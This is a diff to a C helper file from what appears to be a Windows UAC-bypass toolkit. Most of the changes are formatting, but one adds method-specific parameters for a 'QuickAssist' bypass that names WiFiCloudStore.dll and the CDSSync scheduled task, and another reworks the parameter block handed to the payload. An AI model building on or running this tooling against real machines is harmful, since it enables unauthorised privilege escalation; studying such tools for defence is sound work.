@@ -1068,7 +1068,7 @@ VOID NTAPI supxLdrEnumModulesCallback(
 * Purpose:
 *
 * Fake/Restore current process information for COM elevation.
-* 
+*
 * RAiGetTokenForCOM -> AipGetTokenForService -> AiCheckSecureApplicationDirectory
 *
 */
@@ -1626,7 +1626,7 @@ BOOL supReplaceEnvironmentVariableValue(
     _In_ LPWSTR lpVariableName,
     _In_ DWORD dwType,
     _In_opt_ LPWSTR lpVariableData,
-    _Out_opt_ PVOID *lpOldVariableData
+    _Out_opt_ PVOID * lpOldVariableData
 )
 {
     BOOL        bNameAllocated = FALSE, bDoBackup = (lpOldVariableData != NULL);
@@ -2162,7 +2162,7 @@ BOOL supIsCorImageFile(
 */
 NTSTATUS supCreateDirectory(
     _Out_opt_ PHANDLE phDirectory,
-    _In_ OBJECT_ATTRIBUTES* ObjectAttributes,
+    _In_ OBJECT_ATTRIBUTES * ObjectAttributes,
     _In_ ULONG DirectoryShareFlags,
     _In_ ULONG DirectoryAttributes
 )
@@ -2241,9 +2241,9 @@ BOOL supRemoveDirectory(
 *
 */
 PSID supxCreateBoundaryDescriptorSID(
-    SID_IDENTIFIER_AUTHORITY* SidAuthority,
+    SID_IDENTIFIER_AUTHORITY * SidAuthority,
     UCHAR SubAuthorityCount,
-    ULONG* SubAuthorities
+    ULONG * SubAuthorities
 )
 {
     BOOL    bResult = FALSE;
@@ -2274,6 +2274,23 @@ PSID supxCreateBoundaryDescriptorSID(
     return pSid;
 }
 
+VOID supSetMethodSpecificDataToParametersBlock(
+    _In_ UCM_METHOD Method,
+    _In_ PUACME_PARAM_BLOCK ParamBlock
+)
+{
+    switch (Method) {
+
+    case UacMethodQuickAssist:
+        _strcpy(ParamBlock->szOptionalParameter1, TEXT("\\System32\\WiFiCloudStore.dll"));
+        _strcpy(ParamBlock->szOptionalParameter2, TEXT("\\Microsoft\\Windows\\WlanSvc\\CDSSync"));
+        break;
+
+    default:
+        break;
+    }
+}
+
 /*
 * supCreateSharedParametersBlock
 *
@@ -2283,10 +2300,12 @@ PSID supxCreateBoundaryDescriptorSID(
 *
 */
 BOOL supCreateSharedParametersBlock(
-    _In_ PVOID ucmContext)
+    _In_ PVOID ucmContext,
+    _In_ UCM_METHOD ucmMethod,
+    _Inout_ PUACME_PARAM_BLOCK pSharedParams
+)
 {
     BOOL    bResult = FALSE;
-    ULONG   r;
     HANDLE  hBoundary = NULL;
     PVOID   SharedBuffer = NULL;
     SIZE_T  ViewSize;
@@ -2301,8 +2320,6 @@ BOOL supCreateSharedParametersBlock(
     UNICODE_STRING usName;
     OBJECT_ATTRIBUTES obja = RTL_INIT_OBJECT_ATTRIBUTES((PUNICODE_STRING)NULL, 0);
 
-    UACME_PARAM_BLOCK ParamBlock;
-
     ULONG SubAuthoritiesWorld[] = { SECURITY_WORLD_RID };
 
     WCHAR szBoundaryDescriptorName[128];
@@ -2315,18 +2332,13 @@ BOOL supCreateSharedParametersBlock(
     //
     // Fill parameters block.
     // 
-    RtlSecureZeroMemory(&ParamBlock, sizeof(ParamBlock));
-
     if (context->OptionalParameterLength != 0) {
-        _strncpy(ParamBlock.szParameter, MAX_PATH,
+        _strncpy(pSharedParams->szParameter, MAX_PATH,
             context->szOptionalParameter, MAX_PATH);
     }
 
-    ParamBlock.AkagiFlag = context->AkagiFlag;
-    ParamBlock.SessionId = NtCurrentPeb()->SessionId;
-
-    supWinstationToName(NULL, ParamBlock.szWinstation, MAX_PATH * 2, &r);
-    supDesktopToName(NULL, ParamBlock.szDesktop, MAX_PATH * 2, &r);
+    pSharedParams->Flags = context->Flags;
+    pSharedParams->SessionId = NtCurrentPeb()->SessionId;
 
     do {
         //
@@ -2364,17 +2376,20 @@ BOOL supCreateSharedParametersBlock(
         obja.ObjectName = &usName;
 
         //
-        // Create completion event.
+        // Create completion event name.
         //
         RtlSecureZeroMemory(&szObjectName, sizeof(szObjectName));
         supGenerateSharedObjectName((WORD)AKAGI_COMPLETION_EVENT_ID, szObjectName);
         RtlInitUnicodeString(&usName, szObjectName);
-        _strcpy(ParamBlock.szSignalObject, szObjectName);
+        _strcpy(pSharedParams->szSignalObject, szObjectName);
+
+        pSharedParams->MethodId = ucmMethod;
+        supSetMethodSpecificDataToParametersBlock(ucmMethod, pSharedParams);
 
         //
         // Param block is complete. Calc crc32.
         //
-        ParamBlock.Crc32 = RtlComputeCrc32(0, &ParamBlock, sizeof(ParamBlock));
+        pSharedParams->Crc32 = RtlComputeCrc32(0, pSharedParams, sizeof(UACME_PARAM_BLOCK));
 
         if (!NT_SUCCESS(NtCreateEvent(
             &context->SharedContext.hCompletionEvent,
@@ -2421,7 +2436,7 @@ BOOL supCreateSharedParametersBlock(
                 PAGE_READWRITE)))
             {
                 RtlSecureZeroMemory(SharedBuffer, PAGE_SIZE);
-                RtlCopyMemory(SharedBuffer, &ParamBlock, sizeof(ParamBlock));
+                RtlCopyMemory(SharedBuffer, pSharedParams, sizeof(UACME_PARAM_BLOCK));
                 NtUnmapViewOfSection(NtCurrentProcess(), SharedBuffer);
                 bResult = TRUE;
             }
@@ -2532,7 +2547,7 @@ PVOID supCreateUacmeContext(
     //
     // Set Fubuki flag.
     //
-    Context->AkagiFlag = AKAGI_FLAG_KILO;
+    Context->QueryRuntimeInformation = FALSE;
 
     //
     // Remember NtBuildNumber.
@@ -3056,7 +3071,7 @@ PVOID supFindPattern(
 *
 */
 PVOID supLookupImageSectionByName(
-    _In_ CHAR* SectionName,
+    _In_ CHAR * SectionName,
     _In_ ULONG SectionNameLength,
     _In_ PVOID DllBase,
     _Out_ PULONG SectionSize
@@ -3176,7 +3191,7 @@ VOID supEnumUserAssocSetDB(
 *
 */
 NTSTATUS supFindUserAssocSet(
-    _Out_ USER_ASSOC_PTR* Function
+    _Out_ USER_ASSOC_PTR * Function
 )
 {
     HANDLE  hModule;
@@ -3322,7 +3337,7 @@ NTSTATUS supFindUserAssocSet(
 NTSTATUS supRegisterShellAssoc(
     _In_ LPCWSTR pszExt,
     _In_ LPCWSTR pszProgId,
-    _In_ USER_ASSOC_PTR* UserAssocFunc,
+    _In_ USER_ASSOC_PTR * UserAssocFunc,
     _In_ LPCWSTR lpszPayload,
     _In_ BOOL fCustomURIScheme,
     _In_opt_ LPCWSTR pszDefaultValue
@@ -3481,7 +3496,7 @@ NTSTATUS supUnregisterShellAssocEx(
     _In_ BOOLEAN fResetOnly,
     _In_ LPCWSTR pszExt,
     _In_opt_ LPCWSTR pszProgId,
-    _In_ USER_ASSOC_PTR* UserAssocFunc
+    _In_ USER_ASSOC_PTR * UserAssocFunc
 )
 {
     NTSTATUS ntStatus = STATUS_UNSUCCESSFUL;
@@ -3543,7 +3558,7 @@ NTSTATUS supUnregisterShellAssocEx(
 NTSTATUS supUnregisterShellAssoc(
     _In_ LPCWSTR pszExt,
     _In_ LPCWSTR pszProgId,
-    _In_ USER_ASSOC_PTR* UserAssocFunc
+    _In_ USER_ASSOC_PTR * UserAssocFunc
 )
 {
     return supUnregisterShellAssocEx(FALSE,
@@ -3563,7 +3578,7 @@ NTSTATUS supUnregisterShellAssoc(
 NTSTATUS supResetShellAssoc(
     _In_ LPCWSTR pszExt,
     _In_opt_ LPCWSTR pszProgId,
-    _In_ USER_ASSOC_PTR* UserAssocFunc
+    _In_ USER_ASSOC_PTR * UserAssocFunc
 )
 {
     return supUnregisterShellAssocEx(TRUE,
@@ -3746,7 +3761,7 @@ HANDLE supRunProcessFromParent(
     _In_opt_ LPWSTR lpCurrentDirectory,
     _In_ ULONG CreationFlags,
     _In_ WORD ShowWindowFlags,
-    _Out_opt_ HANDLE* PrimaryThread
+    _Out_opt_ HANDLE * PrimaryThread
 )
 {
     BOOL bResult = FALSE;
@@ -3836,7 +3851,7 @@ HANDLE supRunProcessFromParent(
 */
 RPC_STATUS supCreateBindingHandle(
     _In_ RPC_WSTR RpcInterfaceUuid,
-    _Out_ RPC_BINDING_HANDLE* BindingHandle
+    _Out_ RPC_BINDING_HANDLE * BindingHandle
 )
 {
     RPC_STATUS status = RPC_S_INTERNAL_ERROR;
@@ -4280,7 +4295,7 @@ ULONG supWaitForChildProcesses(
             Sleep(1000);
             dwCurrentWait += 1000;
         }
-        else 
+        else
             break;
 
     } while (dwCurrentWait <= dwMaxWait);
@@ -4652,7 +4667,7 @@ BOOLEAN supReplaceVersionInfo(
             break;
         }
 
-        if (!UpdateResource(hUpdate, RT_VERSION, MAKEINTRESOURCEW(1), 
+        if (!UpdateResource(hUpdate, RT_VERSION, MAKEINTRESOURCEW(1),
             MAKELANGID(LANG_ENGLISH, SUBLANG_ENGLISH_US),
             pvBuffer, dwResourceSize))
         {
